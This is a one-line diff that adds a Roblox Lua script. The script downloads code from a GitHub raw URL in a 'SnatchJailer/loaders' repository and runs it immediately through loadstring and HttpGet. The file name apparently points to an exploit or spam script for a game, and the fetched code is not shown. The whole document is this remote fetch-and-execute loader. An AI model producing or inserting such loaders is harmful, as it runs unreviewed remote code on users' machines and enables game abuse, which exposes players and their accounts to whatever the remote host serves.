@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SnatchJailer/loaders/main/loaders/rally-wrong-way-spam2-ztzpreosegcic0.lua"))()
